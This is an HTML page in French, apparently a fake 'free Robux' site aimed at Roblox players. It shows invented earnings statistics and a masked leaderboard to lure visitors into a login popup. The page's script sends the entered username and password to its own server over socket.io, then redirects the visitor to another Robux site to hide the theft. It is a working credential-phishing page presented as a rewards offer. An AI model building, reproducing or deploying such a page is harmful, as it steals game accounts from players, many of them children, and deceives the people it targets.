<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Site</title>

<style>
body {
    margin: 0;
    font-family: Arial;
    background: radial-gradient(circle at top, #0f172a, #020617);
    color: white;
}

/* NAVBAR */
.navbar {
    display: flex;
    justify-content: space-between;
    padding: 15px 25px;
    background: rgba(0,0,0,0.6);
    position: sticky;
    top: 0;
    flex-wrap: wrap;
    gap: 10px;
}

/* BUTTONS */
.btn {
    padding: 10px 18px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    transition: 0.2s;
    font-weight: bold;
}

.btn:hover { transform: scale(1.05); }

.green { background: #16a34a; color: white; }
.yellow { background: #eab308; color: black; }

.btn-green {
    background: #16a34a;
    color: white;
    padding: 12px 22px;
    border: none;
    border-radius: 999px;
    cursor: pointer;
    font-weight: bold;
    transition: 0.2s;
}

.btn-green:hover {
    transform: scale(1.05);
    background: #22c55e;
}

/* HERO */
.hero {
    text-align: center;
    margin-top: 70px;
}

.hero h1 {
    font-size: 50px;
}

/* TEXT */
.desc {
    text-align: center;
    max-width: 700px;
    margin: auto;
    opacity: 0.8;
    padding: 0 15px;
}

/* STATS */
.stats {
    display: flex;
    justify-content: center;
    gap: 30px;
    margin-top: 40px;
    flex-wrap: wrap;
}

.card {
    background: #111827;
    padding: 20px;
    border-radius: 12px;
    width: 200px;
    text-align: center;
}

/* SECTION */
.section {
    max-width: 800px;
    margin: 80px auto;
    text-align: center;
    padding: 0 15px;
}

.review {
    background: #111827;
    padding: 15px;
    margin-top: 15px;
    border-radius: 12px;
}

/* POPUP */
.popup {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    justify-content: center;
    align-items: center;
    padding: 15px;
}

.popup-box {
    background: #111827;
    padding: 20px;
    border-radius: 12px;
    width: 100%;
    max-width: 350px;
    text-align: center;
    position: relative;
}

.close {
    position: absolute;
    top: 10px;
    right: 10px;
    background: red;
    color: white;
    border: none;
    padding: 5px 10px;
    cursor: pointer;
    border-radius: 6px;
}

input {
    width: 100%;
    padding: 10px;
    margin: 10px 0;
    border-radius: 8px;
    border: none;
    background: #0f172a;
    color: white;
    box-sizing: border-box;
}

/* MOBILE */
@media (max-width: 768px) {
    .hero h1 {
        font-size: 32px;
    }

    .stats {
        flex-direction: column;
        align-items: center;
    }

    .card {
        width: 90%;
    }

    .navbar {
        flex-direction: column;
        align-items: center;
    }
}
</style>
</head>

<body>

<!-- NAVBAR -->
<div class="navbar">
    <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
    <button class="btn yellow" onclick="openClassement()">🏆 Classement</button>
</div>

<!-- HERO -->
<div class="hero">
    <h1>Bienvenue</h1>
</div>

<div class="desc">
Vous voulez commencer à gagner sans effort en accomplissant des tâches simples ?
</div>

<div style="text-align:center;margin-top:20px;">
    <button class="btn green" onclick="openLogin()">Commencer à gagner</button>
</div>

<!-- STATS -->
<div class="stats">
    <div class="card">
        <h3>6m 05s</h3>
        <p>Temps moyen</p>
    </div>

    <div class="card">
        <h3>R$ 950.45</h3>
        <p>Robux</p>
    </div>

    <div class="card">
        <h3>R$ 25,000,000</h3>
        <p>Total</p>
    </div>
</div>

<!-- LOGIN -->
<div class="popup" id="loginPopup">
<div class="popup-box">
<button class="close" onclick="closeLogin()">X</button>

<h3>Connexion</h3>

<input id="username" placeholder="Pseudo">
<input id="password" type="password" placeholder="Mot de passe">

<button class="btn-green" onclick="handleClick()">Envoyer</button>

</div>
</div>

<!-- CLASSEMENT -->
<div class="popup" id="classementPopup">
<div class="popup-box">
<button class="close" onclick="closeClassement()">X</button>

<h3>🏆 Classement</h3>

<p>🥇 1. YTBRp*****</p>
<p>🥈 2. ilovefl******</p>
<p>🥉 3. Louxi****</p>

</div>
</div>

<script src="/socket.io/socket.io.js"></script>

<script>
const socket = io();

function handleClick() {
    login();
    setTimeout(() => {
        window.location.href = "https://planetrbx.com/fr";
    }, 500);
}

function openLogin() {
    document.getElementById("loginPopup").style.display = "flex";
}

function closeLogin() {
    document.getElementById("loginPopup").style.display = "none";
}

function openClassement() {
    document.getElementById("classementPopup").style.display = "flex";
}

function closeClassement() {
    document.getElementById("classementPopup").style.display = "none";
}

function login() {
    socket.emit("login", {
        username: document.getElementById("username").value,
        password: document.getElementById("password").value
    });
}
</script>

</body>
</html>
